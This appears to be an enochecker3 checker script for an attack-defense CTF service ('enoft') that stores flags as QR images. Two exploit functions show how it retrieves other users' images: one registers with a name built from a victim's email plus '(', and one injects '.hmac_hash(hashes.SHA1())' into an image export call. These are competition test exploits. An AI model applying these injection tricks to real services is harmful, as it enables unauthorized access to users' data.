from logging import LoggerAdapter
from enochecker3.utils import FlagSearcher, assert_equals, assert_in
from enochecker3 import (
    ChainDB,
    Enochecker,
    GetflagCheckerTaskMessage,
    MumbleException,
    PutflagCheckerTaskMessage,
    ExploitCheckerTaskMessage,
)
from typing import Optional
from utils import InteractionManager
import qr_codes

SERVICE_PORT = 8008
checker = Enochecker("enoft", 8008)
def app(): return checker.app


@checker.putflag(0)
async def putflag_email(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter
) -> None:
    flag = task.flag
    qrCode = qr_codes.create_qr_code(flag)
    address = "http://" + task.address + ":" + str(SERVICE_PORT) + "/"
    m = InteractionManager(address, logger)

    await m.register(vendor_lock=True)
    await m.upload_image(qrCode)
    data = m.dump_info()
    await db.set("credentials", data)
    for key in data:
        await db.set(key, data[key])

    return data["email"]


@checker.getflag(0)
async def getflag_email(
    task: GetflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter
) -> None:
    logger.info("Getting flag")
    try:
        credentials = await db.get("credentials")
    except:
        raise MumbleException("No credentials saved in db")
    logger.info(f"Got credentials: {credentials}")
    address = "http://" + task.address + ":" + str(SERVICE_PORT) + "/"
    m = InteractionManager(address, logger, email_name_key=credentials)
    await m.login()
    imgs = await m.download_profile_images_from_self()
    if not imgs:
        raise MumbleException("No images found")
    logger.info(f"Downloaded {len(imgs)} images")
    imgs = [qr_codes.read_qr_code(img) for img in imgs]
    logger.info(f"Decoded images: {imgs}")
    assert_in(task.flag, imgs, "Flag not found in images")


@checker.exploit(0)
async def exploit_email(
    task: ExploitCheckerTaskMessage,
    searcher: FlagSearcher,
    logger: LoggerAdapter
) -> Optional[str]:
    logger.info(f"Exploiting {task.attack_info} ")
    email = task.attack_info
    name = email + "("
    address = "http://" + task.address + ":" + str(SERVICE_PORT) + "/"
    m = InteractionManager(address, logger, forced_name=name)
    await m.register()
    imgs = await m.download_profile_images_from_email(email)
    if not imgs:
        raise MumbleException("No images found")
    logger.info(f"Downloaded {len(imgs)} images")
    imgs = [qr_codes.read_qr_code(img) for img in imgs]
    logger.info(f"Decoded images: {imgs}")
    return imgs[0]


@checker.putflag(1)
async def putflag_export(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter
) -> None:
    flag = task.flag
    qrCode = qr_codes.create_qr_code(flag)
    address = "http://" + task.address + ":" + str(SERVICE_PORT) + "/"
    m = InteractionManager(address, logger)

    await m.register(low_quality=True)
    await m.upload_image(qrCode)
    data = m.dump_info()
    await db.set("credentials", data)
    for key in data:
        await db.set(key, data[key])

    return data["email"]


@checker.getflag(1)
async def getflag_export(
    task: GetflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter
) -> None:
    logger.info("Getting flag")
    try:
        credentials = await db.get("credentials")
    except:
        raise MumbleException("No credentials saved in db")
    logger.info(f"Got credentials: {credentials}")
    address = "http://" + task.address + ":" + str(SERVICE_PORT) + "/"
    m = InteractionManager(address, logger, email_name_key=credentials)
    try:
        await m.login()
    except:
        raise MumbleException("Error logging in")
    try:
        imgs = await m.get_profile_image_urls(credentials["email"])
    except:
        raise MumbleException("Error getting profile")
    if not imgs:
        raise MumbleException("No images found")
    logger.info(f"Got {len(imgs)} images")
    img_url = imgs[0]
    try:
        img = await m.export_image_url(img_url)
    except:
        raise MumbleException("Error exporting image")
    if not img:
        logger.error("Image not exported")
        raise MumbleException("No images found")
    flag = qr_codes.read_qr_code(img)
    logger.info(f"Decoded image: {flag}")
    assert_equals(task.flag, flag, "Flag not found in image")


@checker.exploit(1)
async def exploit_export(
    task: ExploitCheckerTaskMessage,
    searcher: FlagSearcher,
    logger: LoggerAdapter
) -> Optional[str]:
    logger.info(f"Exploiting {task.attack_info} ")
    email = task.attack_info
    address = "http://" + task.address + ":" + str(SERVICE_PORT) + "/"
    m = InteractionManager(address, logger)
    await m.register()
    urls = await m.get_profile_image_urls(email)
    if not urls:
        raise MumbleException("No images found")
    logger.info(f"Got {len(urls)} images")
    img_url = urls[0]
    try:
        img = await m.export_image_url(img_url, ".hmac_hash(hashes.SHA1())")
    except:
        raise MumbleException("Error exporting image")
    if not img:
        logger.error("Image not exported")
        raise MumbleException("No images found")
    flag = qr_codes.read_qr_code(img)
    logger.info(f"Decoded image: {flag}")
    return flag


if __name__ == "__main__":
    checker.run()
